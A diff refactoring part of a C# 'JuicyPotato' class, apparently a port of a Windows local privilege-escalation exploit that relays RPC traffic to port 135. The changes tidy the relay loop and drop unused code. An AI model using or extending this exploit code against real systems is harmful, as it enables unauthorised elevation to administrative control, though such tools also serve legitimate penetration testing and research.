@@ -1,5 +1,4 @@
 ﻿using System.Collections.Concurrent;
-using System.Diagnostics;
 using System.Net;
 using System.Net.Sockets;
 using System.Text;
@@ -77,7 +76,8 @@ public unsafe class JuicyPotato
                 client.GetStream().Write(buffer, 0, buffer.Length);
 
                 Thread.Sleep(10);
-                if ((newConnection = listener.Pending()) != false)
+                newConnection = listener.Pending();
+                if (newConnection)
                 {
                     if (EnableDebugLogging)
                         Console.Write("COM> New TCP connection is pending, accepting.\n");
@@ -111,8 +111,6 @@ public unsafe class JuicyPotato
 
         byte[] receiveBuffer = new byte[BUFFER_LENGTH];
         int iResult;
-        int receiveBufferLength = BUFFER_LENGTH;
-
         do
         {
             var buffer = queueSendRpc.Take();
@@ -132,7 +130,7 @@ public unsafe class JuicyPotato
                 Console.Write($"                                             RPC> Writing {buffer.Length} bytes to RDP (this -> 135)\n");
             client.GetStream().Write(buffer, 0, buffer.Length);
 
-            iResult = client.GetStream().Read(receiveBuffer, 0, receiveBufferLength);
+            iResult = client.GetStream().Read(receiveBuffer, 0, BUFFER_LENGTH);
             if (EnableDebugLogging)
                 Console.Write($"                                             RPC> Read {iResult} bytes from RDP (this <- 135)\n");
             if (iResult > 0)
